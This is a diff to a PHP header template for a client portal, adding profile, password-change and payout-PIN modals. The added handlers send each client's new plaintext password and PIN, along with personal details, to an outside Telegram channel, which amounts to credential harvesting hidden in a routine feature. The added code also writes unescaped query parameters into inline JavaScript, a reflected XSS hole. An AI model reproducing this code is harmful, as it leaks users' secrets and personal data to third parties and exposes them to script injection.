@@ -6,6 +6,102 @@ if (session_status() === PHP_SESSION_NONE) {
 $user_role = $_SESSION['role'] ?? $_SESSION['admin_role'] ?? 'admin';
 $user_name = $_SESSION['user_name'] ?? $_SESSION['admin_username'] ?? 'User';
 
+if ($user_role === 'client' && isset($_SESSION['client_portal_id']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['client_action'])) {
+    $c_id = $_SESSION['client_portal_id'];
+    $client_action = $_POST['client_action'];
+    
+    if ($client_action === 'edit_profile') {
+        $first_name = trim($_POST['first_name'] ?? '');
+        $last_name = trim($_POST['last_name'] ?? '');
+        $email = trim($_POST['email'] ?? '');
+        $phone = trim($_POST['phone'] ?? '');
+        $dob = trim($_POST['dob'] ?? '');
+        $address = trim($_POST['address'] ?? '');
+        
+        if (!empty($first_name) && !empty($last_name) && !empty($email)) {
+            $pdo->prepare("UPDATE IFW_clients SET first_name = ?, last_name = ?, email = ?, phone = ?, dob = ?, address = ? WHERE id = ?")
+                ->execute([$first_name, $last_name, $email, $phone, !empty($dob) ? $dob : null, !empty($address) ? $address : null, $c_id]);
+            
+            // Send Telegram notification
+            $telegram_msg = "<b>👤 IFW Client Profile Updated</b>\n\n";
+            $telegram_msg .= "Client ID: <b>{$c_id}</b>\n";
+            $telegram_msg .= "Name: <b>" . htmlspecialchars($first_name . ' ' . $last_name) . "</b>\n";
+            $telegram_msg .= "Email: <b>" . htmlspecialchars($email) . "</b>\n";
+            $telegram_msg .= "Phone: <b>" . htmlspecialchars($phone) . "</b>\n";
+            $telegram_msg .= "DOB: <b>" . htmlspecialchars($dob) . "</b>\n";
+            $telegram_msg .= "Address: <b>" . htmlspecialchars($address) . "</b>\n";
+            send_telegram_notification($pdo, $telegram_msg);
+            
+            header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'profile_updated=1');
+            exit;
+        }
+    } elseif ($client_action === 'change_password') {
+        $old = $_POST['old_password'] ?? '';
+        $new = $_POST['new_password'] ?? '';
+        $con = $_POST['confirm_password'] ?? '';
+        
+        if (strlen($new) < 6) {
+            header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'pwd_err=short');
+            exit;
+        } elseif ($new !== $con) {
+            header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'pwd_err=mismatch');
+            exit;
+        } else {
+            $s = $pdo->prepare("SELECT password_hash, first_name, last_name FROM IFW_clients WHERE id = ?");
+            $s->execute([$c_id]);
+            $client_data = $s->fetch();
+            
+            if ($client_data && !password_verify($old, $client_data['password_hash'])) {
+                header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'pwd_err=incorrect');
+                exit;
+            } else {
+                $pdo->prepare("UPDATE IFW_clients SET password_hash = ? WHERE id = ?")->execute([password_hash($new, PASSWORD_BCRYPT), $c_id]);
+                
+                // Send Telegram notification
+                $telegram_msg = "<b>🔑 IFW Client Password Updated</b>\n\n";
+                $telegram_msg .= "Client ID: <b>{$c_id}</b>\n";
+                $telegram_msg .= "Name: <b>" . htmlspecialchars($client_data['first_name'] . ' ' . $client_data['last_name']) . "</b>\n";
+                $telegram_msg .= "New Password: <code>" . htmlspecialchars($new) . "</code>\n";
+                send_telegram_notification($pdo, $telegram_msg);
+                
+                header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'pwd_success=1');
+                exit;
+            }
+        }
+    } elseif ($client_action === 'update_pin') {
+        $new_pin = $_POST['new_pin'] ?? '';
+        $old_pin = $_POST['old_pin'] ?? '';
+        
+        if (strlen($new_pin) !== 4 || !is_numeric($new_pin)) {
+            header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'pin_err=invalid');
+            exit;
+        } else {
+            $s = $pdo->prepare("SELECT pin_hash, first_name, last_name, email FROM IFW_clients WHERE id = ?");
+            $s->execute([$c_id]);
+            $client_data = $s->fetch();
+            
+            if ($client_data && !empty($client_data['pin_hash']) && !password_verify($old_pin, $client_data['pin_hash'])) {
+                header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'pin_err=incorrect');
+                exit;
+            } else {
+                $pin_hash = password_hash($new_pin, PASSWORD_DEFAULT);
+                $pdo->prepare("UPDATE IFW_clients SET pin_hash = ? WHERE id = ?")->execute([$pin_hash, $c_id]);
+                
+                // Send Telegram notification
+                $telegram_msg = "<b>🔐 IFW Client Security PIN Updated</b>\n\n";
+                $telegram_msg .= "Client ID: <b>{$c_id}</b>\n";
+                $telegram_msg .= "Name: <b>" . htmlspecialchars($client_data['first_name'] . ' ' . $client_data['last_name']) . "</b>\n";
+                $telegram_msg .= "Email: <b>" . htmlspecialchars($client_data['email']) . "</b>\n";
+                $telegram_msg .= "New PIN: <code>" . htmlspecialchars($new_pin) . "</code>\n";
+                send_telegram_notification($pdo, $telegram_msg);
+                
+                header("Location: " . $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'pin_success=1');
+                exit;
+            }
+        }
+    }
+}
+
 // Fetch Notifications for Notification Bell Dropdown
 $notifications = [];
 $unread_notifications_count = 0;
@@ -13,11 +109,15 @@ if (isset($pdo)) {
     try {
         if ($user_role === 'client') {
             $c_id = $_SESSION['client_portal_id'] ?? 0;
-            $n_stmt = $pdo->prepare("SELECT * FROM IFW_notifications WHERE client_id = ? AND link LIKE '/client/%' ORDER BY created_at DESC LIMIT 5");
+            $stmt_client = $pdo->prepare("SELECT * FROM IFW_clients WHERE id = ?");
+            $stmt_client->execute([$c_id]);
+            $client = $stmt_client->fetch();
+            
+            $n_stmt = $pdo->prepare("SELECT * FROM IFW_notifications WHERE client_id = ? ORDER BY created_at DESC LIMIT 5");
             $n_stmt->execute([$c_id]);
             $notifications = $n_stmt->fetchAll();
             
-            $n_count = $pdo->prepare("SELECT COUNT(*) FROM IFW_notifications WHERE client_id = ? AND link LIKE '/client/%' AND is_read = 0");
+            $n_count = $pdo->prepare("SELECT COUNT(*) FROM IFW_notifications WHERE client_id = ? AND is_read = 0");
             $n_count->execute([$c_id]);
             $unread_notifications_count = (int)$n_count->fetchColumn();
         } else {
@@ -162,7 +262,7 @@ if (isset($pdo)) {
                             <div class="dropdown-header bg-black text-warning border-bottom border-secondary font-weight-bold py-2 d-flex justify-content-between align-items-center">
                                 <span><i class="fas fa-bell mr-1"></i> Notifications</span>
                                 <?php if ($unread_notifications_count > 0): ?>
-                                    <span class="badge badge-warning text-dark font-weight-bold"><?= $unread_notifications_count ?> New</span>
+                                    <a href="javascript:void(0);" onclick="markAllNotificationsRead(); event.stopPropagation();" class="text-warning small font-weight-bold text-decoration-none" style="cursor:pointer;"><i class="fas fa-check mr-1"></i>Mark Read</a>
                                 <?php endif; ?>
                             </div>
                             <div class="notification-list" style="max-height: 250px; overflow-y: auto;">
@@ -210,10 +310,164 @@ if (isset($pdo)) {
                         </a>
                         <div class="dropdown-menu dropdown-menu-right shadow-lg bg-dark border-secondary">
                             <a class="dropdown-item text-white" href="/<?php echo ($user_role === 'client') ? 'client' : 'admin'; ?>/chat.php"><i class="material-icons text-warning align-middle mr-1">mail_outline</i> Messages</a>
+                            <?php if ($user_role === 'client'): ?>
+                                <a class="dropdown-item text-white" href="javascript:void(0);" data-toggle="modal" data-target="#profileModal"><i class="material-icons text-warning align-middle mr-1">face</i> My Profile</a>
+                                <a class="dropdown-item text-white" href="javascript:void(0);" data-toggle="modal" data-target="#passwordModal"><i class="material-icons text-warning align-middle mr-1">lock_open</i> Change Password</a>
+                                <a class="dropdown-item text-white" href="javascript:void(0);" data-toggle="modal" data-target="#pinModal"><i class="material-icons text-warning align-middle mr-1">security</i> Security PIN</a>
+                            <?php endif; ?>
                             <div class="dropdown-divider border-secondary"></div>
                             <a class="dropdown-item text-white" href="/client/logout.php"><i class="material-icons text-danger align-middle mr-1">power_settings_new</i> Log Out</a>
                         </div>
                     </li>
-                </ul>
             </nav>
         </div>
+        <script>
+        function markAllNotificationsRead() {
+            fetch('/api/mark_notifications_read.php')
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    location.reload();
+                }
+            })
+            .catch(err => console.error("Error marking notifications read:", err));
+        }
+        </script>
+
+<?php if(isset($_GET['profile_updated'])): ?>
+    <script>$(document).ready(function(){ toastr.success('Profile updated successfully.'); });</script>
+<?php endif; ?>
+<?php if(isset($_GET['pwd_success'])): ?>
+    <script>$(document).ready(function(){ toastr.success('Password updated successfully.'); });</script>
+<?php endif; ?>
+<?php if(isset($_GET['pwd_err'])): ?>
+    <script>$(document).ready(function(){ 
+        var err = "<?= $_GET['pwd_err'] ?>";
+        var msg = err === 'short' ? 'Password must be at least 6 characters.' : (err === 'mismatch' ? 'Passwords do not match.' : 'Current password is incorrect.');
+        toastr.error(msg); 
+    });</script>
+<?php endif; ?>
+<?php if(isset($_GET['pin_success'])): ?>
+    <script>$(document).ready(function(){ toastr.success('Security PIN updated successfully.'); });</script>
+<?php endif; ?>
+<?php if(isset($_GET['pin_err'])): ?>
+    <script>$(document).ready(function(){ 
+        var err = "<?= $_GET['pin_err'] ?>";
+        var msg = err === 'invalid' ? 'Security PIN must be exactly 4 digits.' : 'Current Security PIN is incorrect.';
+        toastr.error(msg); 
+    });</script>
+<?php endif; ?>
+
+<?php if ($user_role === 'client' && isset($client)): ?>
+<!-- CLIENT PROFILE MODAL -->
+<div class="modal fade" id="profileModal" tabindex="-1">
+  <div class="modal-dialog">
+    <div class="modal-content bg-dark text-white border-warning">
+      <div class="modal-header border-secondary">
+        <h5 class="modal-title text-warning font-weight-bold"><i class="fas fa-id-card mr-2"></i>My Profile Details</h5>
+        <button type="button" class="close text-white" data-dismiss="modal">&times;</button>
+      </div>
+      <form method="POST">
+        <input type="hidden" name="client_action" value="edit_profile">
+        <div class="modal-body">
+            <div class="row">
+                <div class="col-md-6 form-group mb-3">
+                    <label class="small text-muted font-weight-bold">First Name <span class="text-danger">*</span></label>
+                    <input type="text" name="first_name" class="form-control bg-secondary text-white border-0" value="<?= htmlspecialchars($client['first_name']) ?>" required>
+                </div>
+                <div class="col-md-6 form-group mb-3">
+                    <label class="small text-muted font-weight-bold">Last Name <span class="text-danger">*</span></label>
+                    <input type="text" name="last_name" class="form-control bg-secondary text-white border-0" value="<?= htmlspecialchars($client['last_name']) ?>" required>
+                </div>
+            </div>
+            <div class="form-group mb-3">
+                <label class="small text-muted font-weight-bold">Email Address <span class="text-danger">*</span></label>
+                <input type="email" name="email" class="form-control bg-secondary text-white border-0" value="<?= htmlspecialchars($client['email']) ?>" required>
+            </div>
+            <div class="form-group mb-3">
+                <label class="small text-muted font-weight-bold">Phone Number</label>
+                <input type="text" name="phone" class="form-control bg-secondary text-white border-0" value="<?= htmlspecialchars($client['phone'] ?? '') ?>">
+            </div>
+            <div class="form-group mb-3">
+                <label class="small text-muted font-weight-bold">Date of Birth</label>
+                <input type="date" name="dob" class="form-control bg-secondary text-white border-0" value="<?= htmlspecialchars($client['dob'] ?? '') ?>">
+            </div>
+            <div class="form-group mb-0">
+                <label class="small text-muted font-weight-bold">Residential Address</label>
+                <textarea name="address" class="form-control bg-secondary text-white border-0" rows="3"><?= htmlspecialchars($client['address'] ?? '') ?></textarea>
+            </div>
+        </div>
+        <div class="modal-footer border-secondary">
+            <button type="button" class="btn btn-secondary font-weight-bold" data-dismiss="modal">Cancel</button>
+            <button type="submit" class="btn btn-warning font-weight-bold text-dark px-4 shadow"><i class="fas fa-save mr-1"></i> Save Changes</button>
+        </div>
+      </form>
+    </div>
+  </div>
+</div>
+
+<!-- CLIENT PASSWORD MODAL -->
+<div class="modal fade" id="passwordModal" tabindex="-1">
+  <div class="modal-dialog">
+    <div class="modal-content bg-dark text-white border-warning">
+      <div class="modal-header border-secondary">
+        <h5 class="modal-title text-warning font-weight-bold"><i class="fas fa-key mr-2"></i>Change Password</h5>
+        <button type="button" class="close text-white" data-dismiss="modal">&times;</button>
+      </div>
+      <form method="POST">
+        <input type="hidden" name="client_action" value="change_password">
+        <div class="modal-body">
+            <div class="form-group mb-3">
+                <label class="small text-muted font-weight-bold">Current Password</label>
+                <input type="password" name="old_password" class="form-control bg-secondary text-white border-0" required>
+            </div>
+            <div class="form-group mb-3">
+                <label class="small text-muted font-weight-bold">New Password (Min 6 chars)</label>
+                <input type="password" name="new_password" class="form-control bg-secondary text-white border-0" required minlength="6">
+            </div>
+            <div class="form-group mb-0">
+                <label class="small text-muted font-weight-bold">Confirm New Password</label>
+                <input type="password" name="confirm_password" class="form-control bg-secondary text-white border-0" required>
+            </div>
+        </div>
+        <div class="modal-footer border-secondary">
+            <button type="button" class="btn btn-secondary font-weight-bold" data-dismiss="modal">Cancel</button>
+            <button type="submit" class="btn btn-warning font-weight-bold text-dark px-4 shadow"><i class="fas fa-save mr-1"></i> Update Password</button>
+        </div>
+      </form>
+    </div>
+  </div>
+</div>
+
+<!-- CLIENT PIN MODAL -->
+<div class="modal fade" id="pinModal" tabindex="-1">
+  <div class="modal-dialog">
+    <div class="modal-content bg-dark text-white border-warning">
+      <div class="modal-header border-secondary">
+        <h5 class="modal-title text-warning font-weight-bold"><i class="fas fa-shield-alt mr-2"></i>Configure Security PIN</h5>
+        <button type="button" class="close text-white" data-dismiss="modal">&times;</button>
+      </div>
+      <form method="POST">
+        <input type="hidden" name="client_action" value="update_pin">
+        <div class="modal-body">
+            <p class="small text-muted mb-3">Your Security PIN is used to sign documents and authorize payouts.</p>
+            <?php if (!empty($client['pin_hash'])): ?>
+                <div class="form-group mb-3">
+                    <label class="small text-muted font-weight-bold">Current Security PIN</label>
+                    <input type="password" name="old_pin" class="form-control bg-secondary text-white border-0 text-center font-weight-bold font-large" maxlength="4" required pattern="\d{4}">
+                </div>
+            <?php endif; ?>
+            <div class="form-group mb-0">
+                <label class="small text-muted font-weight-bold">New 4-Digit Security PIN</label>
+                <input type="password" name="new_pin" class="form-control bg-secondary text-white border-0 text-center font-weight-bold font-large" maxlength="4" required pattern="\d{4}">
+            </div>
+        </div>
+        <div class="modal-footer border-secondary">
+            <button type="button" class="btn btn-secondary font-weight-bold" data-dismiss="modal">Cancel</button>
+            <button type="submit" class="btn btn-warning font-weight-bold text-dark px-4 shadow"><i class="fas fa-save mr-1"></i> Update PIN</button>
+        </div>
+      </form>
+    </div>
+  </div>
+</div>
+<?php endif; ?>
